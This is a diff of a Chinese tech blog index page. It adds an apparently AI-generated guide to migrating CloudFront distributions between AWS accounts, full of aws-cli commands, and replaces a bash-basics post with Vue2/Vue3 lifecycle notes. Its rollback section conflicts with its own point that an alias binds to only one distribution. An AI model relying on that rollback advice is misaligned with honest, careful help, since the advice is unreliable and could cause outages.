@@ -184,6 +184,60 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2026/09/19/2026-09-19-expanded-cloudfront-distribution-%E8%B7%A8%E8%B4%A6%E5%8F%B7%E8%BF%81%E7%A7%BB%E6%9C%80%E5%AE%B9%E6%98%93%E8%B8%A9%E7%9A%84%E5%9D%91/">
+                [expanded] CloudFront distribution 跨账号迁移最容易踩的坑
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="expanded-CloudFront-distribution-跨账号迁移最容易踩的坑"><a href="#expanded-CloudFront-distribution-跨账号迁移最容易踩的坑" class="headerlink" title="[expanded] CloudFront distribution 跨账号迁移最容易踩的坑"></a>[expanded] CloudFront distribution 跨账号迁移最容易踩的坑</h1><blockquote>
+<p>原始问题: CloudFront distribution 跨账号迁移最容易踩的坑</p>
+</blockquote>
+<h1 id="CloudFront-Distribution-跨账号迁移的生产级实践与深度避坑指南"><a href="#CloudFront-Distribution-跨账号迁移的生产级实践与深度避坑指南" class="headerlink" title="CloudFront Distribution 跨账号迁移的生产级实践与深度避坑指南"></a>CloudFront Distribution 跨账号迁移的生产级实践与深度避坑指南</h1><h2 id="背景与场景"><a href="#背景与场景" class="headerlink" title="背景与场景"></a>背景与场景</h2><p>CloudFront distribution 跨账号迁移通常发生在企业组织架构调整、业务单元拆分、安全合规要求或多云战略实施场景。核心挑战在于 CloudFront 的 CNAME 绑定具有全局唯一性约束——同一 CNAME 在 AWS 全球范围内只能关联到一个 distribution。这意味着在目标账号创建新 distribution 并绑定 CNAME 之前,必须先从源账号解绑,这个窗口期会导致服务中断。典型场景包括:从共享服务账号迁移到业务独立账号、从开发账号迁移到生产账号、或因收购兼并导致的资源整合。迁移过程需要同步处理 SSL 证书(ACM)、Origin 配置、Cache Behavior、Lambda@Edge 函数等多个依赖组件,任何环节的疏漏都可能导致长时间停机或功能降级。</p>
+<h2 id="诊断与预检步骤"><a href="#诊断与预检步骤" class="headerlink" title="诊断与预检步骤"></a>诊断与预检步骤</h2><p>在执行任何变更前,必须通过只读命令完整采集源 distribution 的配置快照和依赖关系。首先使用 <code>aws cloudfront get-distribution --id E1234567890ABC</code> 导出完整配置 JSON,特别关注 <code>Aliases</code>(CNAME 列表)、<code>ViewerCertificate</code>(SSL 证书 ARN)、<code>Origins</code> 配置和 <code>CacheBehaviors</code>。验证 ACM 证书状态:<code>aws acm describe-certificate --certificate-arn arn:aws:acm:us-east-1:111111111111:certificate/xxx</code>,确认证书在 us-east-1 区域且状态为 ISSUED。检查 DNS 当前解析:<code>dig cdn.example.com</code> 确认 CNAME 指向的 CloudFront 域名(格式 d111111abcdef8.cloudfront.net)。</p>
+<p>使用 <code>aws cloudfront list-distributions --query &quot;DistributionList.Items[?contains(Aliases.Items, &#39;cdn.example.com&#39;)]&quot;</code> 确认 CNAME 当前绑定状态。检查 Origin 的访问权限:如果使用 S3 作为 Origin,验证 OAI(Origin Access Identity)或 OAC(Origin Access Control)配置;如果使用自定义 Origin,确认目标账号的 ALB&#x2F;EC2 安全组规则允许 CloudFront IP 范围访问。验证 Lambda@Edge 函数:<code>aws lambda get-function --function-name arn:aws:lambda:us-east-1:111111111111:function:edge-function</code>,确认函数代码和 IAM 角色可在目标账号重建。检查 WAF Web ACL 关联:<code>aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1</code>,记录 ACL ID 和规则配置。最后通过 CloudWatch 查询过去 7 天的请求量和错误率基线:<code>aws cloudwatch get-metric-statistics --namespace AWS/CloudFront --metric-name Requests --dimensions Name=DistributionId,Value=E1234567890ABC --start-time 2024-01-01T00:00:00Z --end-time 2024-01-08T00:00:00Z --period 3600 --statistics Sum</code>,建立 SLO 基准。</p>
+<h2 id="迁移方案-备份与准备阶段"><a href="#迁移方案-备份与准备阶段" class="headerlink" title="迁移方案:备份与准备阶段"></a>迁移方案:备份与准备阶段</h2><p>在目标账号 B 完成所有依赖资源的预创建,确保迁移窗口期只需执行 CNAME 切换。首先在账号 B 的 us-east-1 区域申请新的 ACM 证书,覆盖所有需要的域名(包括主域名和备用域名),使用 DNS 验证方式:<code>aws acm request-certificate --domain-name cdn.example.com --subject-alternative-names *.cdn.example.com --validation-method DNS --region us-east-1</code>。将验证所需的 CNAME 记录添加到 Route 53 或外部 DNS,等待证书状态变为 ISSUED(通常 5-30 分钟)。</p>
+<p>如果使用 S3 作为 Origin,在账号 B 创建新 bucket 并配置跨账号复制,或使用 <code>aws s3 sync</code> 同步数据。配置新的 OAC:<code>aws cloudfront create-origin-access-control --origin-access-control-config &#39;&#123;&quot;Name&quot;:&quot;oac-for-migration&quot;,&quot;SigningProtocol&quot;:&quot;sigv4&quot;,&quot;SigningBehavior&quot;:&quot;always&quot;,&quot;OriginAccessControlOriginType&quot;:&quot;s3&quot;&#125;&#39;</code>,并更新 S3 bucket policy 允许该 OAC 访问。如果使用 Lambda@Edge,在账号 B 重新部署函数(必须在 us-east-1 区域)并发布版本:<code>aws lambda publish-version --function-name edge-function</code>,记录带版本号的 ARN(格式 arn:aws:lambda:us-east-1:222222222222:function:edge-function:1)。</p>
+<p>在账号 B 创建新 distribution,使用从账号 A 导出的配置 JSON 作为模板,但<strong>暂时不添加 CNAME</strong>:<code>aws cloudfront create-distribution --distribution-config file://distribution-config.json</code>。修改 JSON 中的 <code>Aliases.Quantity</code> 为 0,<code>Aliases.Items</code> 为空数组,更新 <code>ViewerCertificate.ACMCertificateArn</code> 为账号 B 的证书 ARN,更新 <code>Origins</code> 配置指向账号 B 的资源。等待新 distribution 状态变为 Deployed(通常 15-30 分钟):<code>aws cloudfront wait distribution-deployed --id E9876543210XYZ</code>。使用 CloudFront 默认域名(d222222abcdef8.cloudfront.net)进行功能验证,通过 curl 测试关键路径:<code>curl -H &quot;Host: cdn.example.com&quot; https://d222222abcdef8.cloudfront.net/index.html -v</code>,确认响应头、缓存行为和内容正确性。</p>
+<h2 id="迁移方案-执行切换阶段"><a href="#迁移方案-执行切换阶段" class="headerlink" title="迁移方案:执行切换阶段"></a>迁移方案:执行切换阶段</h2><p>在计划的维护窗口,按严格顺序执行 CNAME 解绑和绑定操作。首先降低 DNS TTL 至最小值(60 秒):<code>aws route53 change-resource-record-sets --hosted-zone-id Z1234567890ABC --change-batch &#39;&#123;&quot;Changes&quot;:[&#123;&quot;Action&quot;:&quot;UPSERT&quot;,&quot;ResourceRecordSet&quot;:&#123;&quot;Name&quot;:&quot;cdn.example.com&quot;,&quot;Type&quot;:&quot;CNAME&quot;,&quot;TTL&quot;:60,&quot;ResourceRecords&quot;:[&#123;&quot;Value&quot;:&quot;d111111abcdef8.cloudfront.net&quot;&#125;]&#125;&#125;]&#125;&#39;</code>,等待 2 倍原 TTL 时间让全球 DNS 缓存过期。</p>
+<p>从账号 A 的 distribution 移除 CNAME:先获取当前 ETag <code>aws cloudfront get-distribution-config --id E1234567890ABC --query &#39;ETag&#39; --output text</code>,然后更新配置 <code>aws cloudfront update-distribution --id E1234567890ABC --if-match &lt;ETag&gt; --distribution-config file://config-without-cname.json</code>。配置 JSON 中将 <code>Aliases.Quantity</code> 改为 0,<code>Aliases.Items</code> 改为空数组。等待更新完成(3-5 分钟):<code>aws cloudfront wait distribution-deployed --id E1234567890ABC</code>。此时 CNAME 已全局释放,立即在账号 B 添加 CNAME:获取账号 B distribution 的 ETag,更新配置添加 <code>Aliases</code>:<code>aws cloudfront update-distribution --id E9876543210XYZ --if-match &lt;ETag&gt; --distribution-config file://config-with-cname.json</code>。等待部署完成后,更新 DNS 记录指向新 distribution:<code>aws route53 change-resource-record-sets --hosted-zone-id Z1234567890ABC --change-batch &#39;&#123;&quot;Changes&quot;:[&#123;&quot;Action&quot;:&quot;UPSERT&quot;,&quot;ResourceRecordSet&quot;:&#123;&quot;Name&quot;:&quot;cdn.example.com&quot;,&quot;Type&quot;:&quot;CNAME&quot;,&quot;TTL&quot;:60,&quot;ResourceRecords&quot;:[&#123;&quot;Value&quot;:&quot;d222222abcdef8.cloudfront.net&quot;&#125;]&#125;&#125;]&#125;&#39;</code>。</p>
+<p>整个切换窗口期控制在 5-10 分钟内,期间通过 CloudWatch 实时监控两个 distribution 的请求量:<code>aws cloudwatch get-metric-statistics --namespace AWS/CloudFront --metric-name Requests --dimensions Name=DistributionId,Value=E9876543210XYZ --start-time $(date -u -d &#39;5 minutes ago&#39; +%Y-%m-%dT%H:%M:%S) --end-time $(date -u +%Y-%m-%dT%H:%M:%S) --period 60 --statistics Sum</code>。观察账号 A 的流量下降和账号 B 的流量上升曲线,确认流量完全切换后,将 DNS TTL 恢复至正常值(300-3600 秒)。保留账号 A 的 distribution 处于禁用状态至少 72 小时,作为快速回滚路径,期间持续监控 4xx&#x2F;5xx 错误率和延迟指标。</p>
+<h2 id="迁移方案-回滚预案"><a href="#迁移方案-回滚预案" class="headerlink" title="迁移方案:回滚预案"></a>迁移方案:回滚预案</h2><p>任何生产变更都必须准备完整回滚方案,CloudFront 迁移的回滚窗口分为三个阶段。<strong>阶段一(切换后 10 分钟内)</strong>:如果发现账号 B 的 distribution 出现严重错误(5xx &gt; 1%),立即执行 DNS 回滚,将 CNAME 记录改回指向账号 A 的 CloudFront 域名 d111111abcdef8.cloudfront.net,无需修改 distribution 配置。由于 DNS TTL 已降至 60 秒,流量将在 2-3 分钟内回切,此时账号 A 的 distribution 仍保留完整配置(虽然 CNAME 已解绑,但通过 CloudFront 默认域名仍可访问)。</p>
+<p><strong>阶段二(切换后 10-60 分钟)</strong>:如果需要完全恢复账号 A 的 CNAME 绑定,先从账号 B 移除 CNAME(update-distribution 设置 Aliases 为空),等待部署完成后,在账号 A 重新添加 CNAME,然后更新 DNS。这个过程需要 8-15 分钟,期间服务会短暂中断,但可恢复到迁移前状态。<strong>阶段三(切换后 60 分钟以上)</strong>:如果已观察到部分用户流量切换成功,但存在局部问题(如特定地理区域缓存异常),采用 DNS 加权路由策略,将 10% 流量导向账号 B,90% 保留在账号 A,逐步调整权重比例。Route 53 配置示例:<code>aws route53 change-resource-record-sets --hosted-zone-id Z1234567890ABC --change-batch file://weighted-routing.json</code>,JSON 中定义两条 CNAME 记录,SetIdentifier 分别为 “account-a” 和 “account-b”,Weight 设置为 90 和 10。</p>
+<p>所有回滚操作必须在执行前通过 <code>aws cloudfront get-distribution-config</code> 重新获取最新 ETag,避免因并发修改导致 PreconditionFailed 错误。回滚后立即触发全链路健康检查,验证关键 API 端点、静态资源加载和动态内容生成,确认 RTO(恢复时间目标)&lt; 15 分钟,RPO(恢复点目标)&#x3D; 0(无数据丢失)。</p>
+<h2 id="五大典型踩坑与规避方案"><a href="#五大典型踩坑与规避方案" class="headerlink" title="五大典型踩坑与规避方案"></a>五大典型踩坑与规避方案</h2><p><strong>坑一:ACM 证书区域错误</strong>。CloudFront 只能使用 us-east-1 区域的 ACM 证书,即使在其他区域申请了相同域名的证书也无法使用。症状:创建 distribution 时报错 “The specified SSL certificate doesn’t exist, isn’t in us-east-1 region, isn’t valid, or doesn’t include a valid certificate chain”。规避:在目标账号的 us-east-1 区域预先申请证书,使用 <code>--region us-east-1</code> 参数强制指定区域,验证时检查 <code>aws acm list-certificates --region us-east-1</code> 输出。</p>
+<p><strong>坑二:CNAME 绑定竞态条件</strong>。从账号 A 解绑 CNAME 到账号 B 绑定之间存在时间窗口,如果操作不够快,可能被其他 AWS 账号抢注(虽然概率极低,但在自动化脚本中可能因重试逻辑触发)。症状:账号 B 执行 update-distribution 时报错 “One or more of the CNAMEs you provided are already associated with a different resource”。规避:使用脚本将解绑和绑定操作串联执行,中间间隔 &lt; 30 秒,并添加指数退避重试逻辑(最多重试 3 次,间隔 10&#x2F;20&#x2F;40 秒)。在企业环境中,通过 AWS Organizations SCP(Service Control Policy)限制其他账号创建 CloudFront distribution,降低冲突风险。</p>
+<p><strong>坑三:Lambda@Edge 版本引用错误</strong>。Lambda@Edge 必须使用带版本号的 ARN(如 :1、:2),不能使用 $LATEST 或别名。症状:distribution 创建成功但部署卡在 “InProgress” 状态超过 1 小时,或报错 “The function ARN must reference a specific version”。规避:在账号 B 部署 Lambda 函数后,立即执行 <code>aws lambda publish-version</code> 并记录返回的版本号,在 distribution 配置中使用完整 ARN(arn:aws:lambda:us-east-1:222222222222:function:edge-function:1)。注意 Lambda@Edge 的 IAM 角色必须包含信任策略允许 edgelambda.amazonaws.com 和 lambda.amazonaws.com 两个服务主体。</p>
+<p><strong>坑四:Origin 访问权限未同步</strong>。迁移后 CloudFront 可以访问 Origin,但返回 403 错误,因为新 distribution 的 OAI&#x2F;OAC 未被 S3 bucket policy 授权,或 ALB 安全组未放行新 distribution 的 IP 范围。症状:CloudFront 返回 “Access Denied” 或 “403 Forbidden”,CloudWatch Logs 显示 “OriginAccessDenied”。规避:在账号 B 创建 OAC 后,立即更新 S3 bucket policy 添加 <code>&quot;Service&quot;: &quot;cloudfront.amazonaws.com&quot;</code> 和 <code>&quot;Condition&quot;: &#123;&quot;StringEquals&quot;: &#123;&quot;AWS:SourceArn&quot;: &quot;arn:aws:cloudfront::222222222222:distribution/E9876543210XYZ&quot;&#125;&#125;</code>。对于 ALB Origin,使用 AWS 托管前缀列表 <code>com.amazonaws.global.cloudfront.origin-facing</code> 更新安全组入站规则,避免手动维护 IP 范围。</p>
+<p><strong>坑五:缓存失效策略遗漏</strong>。迁移后新 distribution 的缓存为空,首次请求会全部回源,导致 Origin 负载激增和延迟飙升。症状:迁移后 5-10 分钟内 Origin 服务器 CPU&#x2F;网络带宽打满,CloudFront CacheHitRate 指标降至 0%。规避:在切换前预热新 distribution 的缓存,使用脚本批量请求热点 URL:<code>for url in $(cat hot-urls.txt); do curl -s &quot;https://d222222abcdef8.cloudfront.net$url&quot; -H &quot;Host: cdn.example.com&quot; &gt; /dev/null; done</code>。或在切换后立即创建失效请求,将账号 A 的热点路径标记为失效,触发账号 B 主动回源填充缓存:<code>aws cloudfront create-invalidation --distribution-id E9876543210XYZ --paths &quot;/*&quot;</code>(注意失效请求有配额限制,每月前 1000 个路径免费)。</p>
+<h2 id="架构优化与可观测性建议"><a href="#架构优化与可观测性建议" class="headerlink" title="架构优化与可观测性建议"></a>架构优化与可观测性建议</h2><p>在企业级场景中,应采用蓝绿部署或金丝雀发布策略降低迁移风险。通过 Route 53 加权路由策略,初始将 5% 流量导向账号 B 的新 distribution,观察 30 分钟后逐步提升至 10%&#x2F;25%&#x2F;50%&#x2F;100%,每个阶段设置 SLO 门槛(如 P99 延迟 &lt; 200ms,错误率 &lt; 0.1%)。使用 CloudWatch Synthetics Canary 创建持续监控任务,每分钟从全球多个区域发起测试请求,验证 SSL 握手、DNS 解析、内容完整性和响应时间:<code>aws synthetics create-canary --name cdn-migration-canary --artifact-s3-location s3://canary-results/ --execution-role-arn arn:aws:iam::222222222222:role/CanaryRole --schedule Expression=&quot;rate(1 minute)&quot; --runtime-version syn-nodejs-puppeteer-3.9</code>。</p>
+<p>在 CloudWatch 中配置复合告警,关联多个指标(Requests、4xxErrorRate、5xxErrorRate、OriginLatency)设置动态阈值,当任一指标偏离基线 2 个标准差时触发 SNS 通知和自动回滚 Lambda。启用 CloudFront 实时日志(Real-time Logs)推送到 Kinesis Data Streams,使用 Kinesis Data Analytics 实时计算滑动窗口内的错误率和延迟分位数,实现秒级异常检测。对于关键业务,部署多区域主备架构,使用 Route 53 健康检查和故障转移路由策略,当主 distribution 健康检查失败时自动切换到备用 distribution,RTO &lt; 60 秒。</p>
+<p>建立迁移后的持续验证机制,通过 AWS Config 规则检测 distribution 配置漂移(如 CNAME 被意外修改、SSL 证书过期),通过 EventBridge 监听 CloudFront API 调用事件,任何非授权的配置变更触发告警和自动修复。在成本优化方面,对比迁移前后的 CloudFront 数据传输费用和请求费用,使用 Cost Explorer 按 distribution ID 分组分析,识别异常流量来源。定期审计 Origin Shield 配置,对于高缓存命中率的内容启用 Origin Shield 降低回源成本,选择靠近 Origin 的最优区域(如 Origin 在 us-east-1,则 Origin Shield 选择 us-east-1)。</p>
+<h2 id="参考-Runbook-与命令速查"><a href="#参考-Runbook-与命令速查" class="headerlink" title="参考 Runbook 与命令速查"></a>参考 Runbook 与命令速查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导出源 distribution 完整配置</span></span><br><span class="line">aws cloudfront get-distribution-config --<span class="built_in">id</span> E1234567890ABC &gt; dist-config.json</span><br><span class="line">jq <span class="string">&#x27;.DistributionConfig&#x27;</span> dist-config.json &gt; dist-config-only.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 CNAME 当前绑定状态</span></span><br><span class="line">aws cloudfront list-distributions --query <span class="string">&quot;DistributionList.Items[?Aliases.Items!=null] | [].&#123;ID:Id,CNAMEs:Aliases.Items&#125;&quot;</span> --output table</span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请 ACM 证书(us-east-1)</span></span><br><span class="line">aws acm request-certificate --domain-name cdn.example.com --validation-method DNS --region us-east-1 --query <span class="string">&#x27;CertificateArn&#x27;</span> --output text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 OAC</span></span><br><span class="line">aws cloudfront create-origin-access-control --origin-access-control-config <span class="string">&#x27;&#123;&quot;Name&quot;:&quot;migration-oac&quot;,&quot;SigningProtocol&quot;:&quot;sigv4&quot;,&quot;SigningBehavior&quot;:&quot;always&quot;,&quot;OriginAccessControlOriginType&quot;:&quot;s3&quot;&#125;&#x27;</span> --query <span class="string">&#x27;OriginAccessControl.Id&#x27;</span> --output text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 distribution 移除 CNAME(需先获取 ETag)</span></span><br><span class="line">ETAG=$(aws cloudfront get-distribution-config --<span class="built_in">id</span> E1234567890ABC --query <span class="string">&#x27;ETag&#x27;</span> --output text)</span><br><span class="line">aws cloudfront update-distribution --<span class="built_in">id</span> E1234567890ABC --if-match <span class="variable">$ETAG</span> --distribution-config file://config-no-cname.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待 distribution 部署完成</span></span><br><span class="line">aws cloudfront <span class="built_in">wait</span> distribution-deployed --<span class="built_in">id</span> E9876543210XYZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建缓存失效</span></span><br><span class="line">aws cloudfront create-invalidation --distribution-id E9876543210XYZ --paths <span class="string">&quot;/index.html&quot;</span> <span class="string">&quot;/static/*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实时监控请求量(最近 5 分钟)</span></span><br><span class="line">aws cloudwatch get-metric-statistics --namespace AWS/CloudFront --metric-name Requests --dimensions Name=DistributionId,Value=E9876543210XYZ --start-time $(<span class="built_in">date</span> -u -d <span class="string">&#x27;5 min ago&#x27;</span> +%Y-%m-%dT%H:%M:%S) --end-time $(<span class="built_in">date</span> -u +%Y-%m-%dT%H:%M:%S) --period 60 --statistics Sum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询错误率</span></span><br><span class="line">aws cloudwatch get-metric-statistics --namespace AWS/CloudFront --metric-name 5xxErrorRate --dimensions Name=DistributionId,Value=E9876543210XYZ --start-time $(<span class="built_in">date</span> -u -d <span class="string">&#x27;10 min ago&#x27;</span> +%Y-%m-%dT%H:%M:%S) --end-time $(<span class="built_in">date</span> -u +%Y-%m-%dT%H:%M:%S) --period 60 --statistics Average</span><br></pre></td></tr></table></figure>
+
+<p>关键运维检查点:迁移前验证 ACM 证书状态(ISSUED)和区域(us-east-1),确认 Origin 可达性和访问权限,备份源 distribution 完整配置;迁移中严格控制 CNAME 解绑到绑定的时间窗口 &lt; 30 秒,实时监控两侧流量切换曲线;迁移后持续观察 72 小时,对比错误率、延迟和缓存命中率基线,保留源 distribution 作为快速回滚路径。所有操作记录审计日志,通过 CloudTrail 追溯配置变更历史,建立标准化 runbook 和自动化脚本,降低人为失误风险。</p>
+<hr>
+<p><em>by claude-sonnet-5 nightly expand · 2026-09-19</em></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">
                 [expanded] [blog] Linux命令
             </a>
@@ -435,8 +489,8 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/shell/">
-                Shell
+            <a href="/2026/09/19/vue2vsvue3/">
+                vue2 对比 vue3
             </a>
         </h1>
         <div class="post-info">
@@ -446,7 +500,7 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
             
             
                 <span class="category">
-                    <a href="/categories/Linux/">Linux</a>
+                    <a href="/categories/前端/">前端</a>
                 </span>
             
         </div>
@@ -454,34 +508,55 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     
         <div class="content">
-            <ul>
-<li>bash - UNIX shell 目的是作为 Bourne Shell (sh) 的免费软件替代品 (Bash 是 Linus Torvalds（Linux 的创建者）移植到 Linux 的首批程序之一)</li>
-<li>Z shell - 一个与 Bash 非常相似的 UNIX shell,Zsh 是 Bourne shell 的扩展</li>
-<li>Fish Shell - 一个强调交互性和可用性的 UNIX shell 环境,与 Zsh 不同，Fish 旨在为用户提供交互性，而不是信任用户实现自己的配置</li>
-</ul>
+            <h2 id="图层渲染"><a href="#图层渲染" class="headerlink" title="图层渲染"></a>图层渲染</h2><h3 id="VUE2-渲染流程图"><a href="#VUE2-渲染流程图" class="headerlink" title="VUE2 渲染流程图"></a>VUE2 渲染流程图</h3><p>主function<br>prop 父组件传入数据 template中使用<br>data()<br>watch 数据监听 对data数据监听<br>create()<br>methods</p>
+<p>vue init()<br>vue $mount()<br>初始化渲染watcher</p>
+<p>render 初次渲染</p>
+<p>组件模式 （自己写组件）<br>父组件（引用）<br>子组件（自己写的组件）</p>
+<p>父-&gt;子 prop 或者 data写数据 传给标签 再从标签取值<br>子-&gt;父 ref 标记 后 去除数据</p>
+<p>compment标签<br>（组件问题）</p>
+<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><table>
+<thead>
+<tr>
+<th>vue2</th>
+<th>vue3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>beforeCreate</td>
+<td></td>
+</tr>
+<tr>
+<td>created</td>
+<td></td>
+</tr>
+<tr>
+<td>beforeMount</td>
+<td>onBeforeMount</td>
+</tr>
+<tr>
+<td>mounted</td>
+<td>onMounted</td>
+</tr>
+<tr>
+<td>beforeUpdate</td>
+<td>onBeforeUpdate</td>
+</tr>
+<tr>
+<td>updated</td>
+<td>onUpdated</td>
+</tr>
+<tr>
+<td>beforeDestroy</td>
+<td>onBeforeUnmount</td>
+</tr>
+<tr>
+<td>destroyed</td>
+<td>onUnmounted</td>
+</tr>
+</tbody></table>
 <blockquote>
-<p>Bash、Z Shell 和 Fish Shell 各有优点，也有一些相似之处。既然对它们有了更多的了解，你就可以在工作中更有效地使用它们。<br>如果你想要更可配置的 shell，你可以使用 Zsh（甚至安装 Oh My Zsh）。如果你想要更多交互的终端体验，同时不需要大量配置，你可以使用 Fish Shell。如果你想要经典的感觉，你可以保留 Bash。</p>
+<p>Tips： setup 是围绕 beforeCreate 和 created 生命周期钩子运行的，所以不需要显式地去定义。</p>
 </blockquote>
-<h2 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h2><h3 id="shell-基础"><a href="#shell-基础" class="headerlink" title="shell 基础"></a>shell 基础</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `<span class="built_in">ls</span> /etc`</span><br><span class="line">或</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> /etc)</span><br><span class="line"><span class="comment"># 以上语句将 /etc 下目录的文件名循环出来。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符串长度 &#123;#&#125;</span></span><br><span class="line"><span class="comment"># $&#123;#string&#125; 等价于 $&#123;#string[0]&#125;:</span></span><br><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string[0]&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;两数之和为 : <span class="variable">$val</span>&quot;</span> <span class="comment"># 输出 两数之和为 : 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f  file ]    <span class="comment"># 如果 文件存在</span></span><br><span class="line"><span class="keyword">if</span> [ -d ...   ]    <span class="comment"># 如果 目录存在</span></span><br><span class="line"><span class="keyword">if</span> [ -s file  ]    <span class="comment"># 如果 文件存在且非空 </span></span><br><span class="line"><span class="keyword">if</span> [ -r file  ]    <span class="comment"># 如果 文件存在且可读</span></span><br><span class="line"><span class="keyword">if</span> [ -w file  ]    <span class="comment"># 如果 文件存在且可写</span></span><br><span class="line"><span class="keyword">if</span> [ -x file  ]    <span class="comment"># 如果 文件存在且可执行   </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数变量表达式</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -eq int2 ]    <span class="comment"># 如果 int1等于int2   </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ne int2 ]    <span class="comment"># 如果 不等于    </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ge int2 ]    <span class="comment"># 如果 &gt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -gt int2 ]    <span class="comment"># 如果 &gt;</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -le int2 ]    <span class="comment"># 如果 &lt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -lt int2 ]    <span class="comment"># 如果 &lt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 字符串变量表达式</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$a</span> = <span class="variable">$b</span> ]                 <span class="comment"># 如果string1等于string2</span></span><br><span class="line">                                <span class="comment"># 字符串允许使用赋值号做等号</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$string1</span> !=  <span class="variable">$string2</span> ]   <span class="comment"># 如果string1不等于string2       </span></span><br><span class="line"><span class="keyword">if</span>  [ -n <span class="variable">$string</span>  ]             <span class="comment"># 如果string 非空(非0），返回0(true)  </span></span><br><span class="line"><span class="keyword">if</span>  [ -z <span class="variable">$string</span>  ]             <span class="comment"># 如果string 为空</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$sting</span> ]                  <span class="comment"># 如果string 非空，返回0 (和-n类似) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nohup 防止进程被挂起或终端结束</span></span><br><span class="line"><span class="built_in">nohup</span> sshpass -p <span class="string">&quot;<span class="variable">$&#123;passphrase&#125;</span>&quot;</span> ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -C -c aes128-gcm@openssh.com -fNg -L 9200:127.0.0.1:9200   ec2-user@xx.xx.xx &gt; /dev/null &amp;</span><br></pre></td></tr></table></figure>
-
-<h3 id="标准脚本"><a href="#标准脚本" class="headerlink" title="标准脚本"></a>标准脚本</h3><p>git 基本上传操作</p>
